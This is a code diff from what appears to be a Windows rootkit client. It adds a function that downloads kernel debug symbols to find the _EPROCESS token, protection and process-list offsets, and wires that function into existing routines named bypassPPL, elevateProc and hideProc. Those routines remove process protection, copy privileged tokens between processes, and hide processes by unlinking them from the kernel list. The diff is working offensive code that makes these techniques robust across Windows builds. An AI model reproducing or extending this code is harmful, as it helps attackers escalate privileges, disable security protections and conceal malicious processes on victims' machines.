@@ -5,6 +5,8 @@
 #include <tchar.h>
 #include <tlhelp32.h>
 #include <wincrypt.h>
+#include "EzPdb.h"
+
 
 // Link with required libraries
 #pragma comment (lib, "Crypt32.lib")
@@ -240,6 +242,45 @@ offsets getOffsetByBuild(void) {
 	off.ActiveProcessLinks = ActiveProcessLinks;
 
     return off;
+}
+
+offsets getOffsetswithPdb() {
+    offsets offs = { 0 };
+    std::string kernel = std::string(std::getenv("systemroot")) + "\\System32\\ntoskrnl.exe";
+    std::string pdbPath = EzPdbDownload(kernel);
+
+    if (pdbPath.empty())
+    {
+        std::cout << "download pdb failed " << GetLastError() << std::endl;;
+        return offs;
+    }
+
+    EZPDB pdb;
+    if (!EzPdbLoad(pdbPath, &pdb))
+    {
+        std::cout << "load pdb failed " << GetLastError() << std::endl;
+        return offs;
+    }
+
+    //ULONG rva = EzPdbGetRva(&pdb, "NtTerminateThread");
+    ULONG tokenOffset = EzPdbGetStructPropertyOffset(&pdb, "_EPROCESS", L"Token");
+    printf("token offset: 0x%x \n", tokenOffset);
+
+    ULONG protectionOffset = EzPdbGetStructPropertyOffset(&pdb, "_EPROCESS", L"Protection");
+
+    printf("protection offset: 0x%x \n", protectionOffset);
+
+    ULONG activeproclinkOffset = EzPdbGetStructPropertyOffset(&pdb, "_EPROCESS", L"ActiveProcessLinks");
+
+    printf("ActiveProcessLinks offset: 0x%x", activeproclinkOffset);
+
+    offs.ActiveProcessLinks = activeproclinkOffset;
+    offs.ProtectionOffset = protectionOffset;
+    offs.tokenOffset = tokenOffset;
+
+    EzPdbUnload(&pdb);
+
+    return offs;
 }
 
 
@@ -824,8 +865,8 @@ BOOL bypassPPL(HANDLE hDevice, DWORD pid) {
     ModulesData* resultArray = NULL;
     ULONG64 modulesCount = 0;
     BOOL result;
-	offsets off = getOffsetByBuild();
-
+	//offsets off = getOffsetByBuild();
+    offsets off = getOffsetswithPdb();
 	DWORD offset = off.ProtectionOffset;
 
 	pplData data;
@@ -854,8 +895,8 @@ BOOL bypassPPL(HANDLE hDevice, DWORD pid) {
 BOOL elevateProc(HANDLE hDevice, DWORD pid1, DWORD pid2) {
     BOOL result;
 	DWORD bytesReturned;
-	offsets off = getOffsetByBuild();
-
+	//offsets off = getOffsetByBuild();
+    offsets off = getOffsetswithPdb();
 	DWORD offset = off.tokenOffset;
 	elevateProcArgs data;
 
@@ -891,8 +932,8 @@ BOOL hideProc(HANDLE hDevice, DWORD pid) {
     DWORD bytesReturned;
     BOOL result;
 
-	offsets off = getOffsetByBuild();
-
+	//offsets off = getOffsetByBuild();
+    offsets off = getOffsetswithPdb();
 	hideProcArgs data;
 	data.pid = pid;
 	data.offset = off.ActiveProcessLinks;
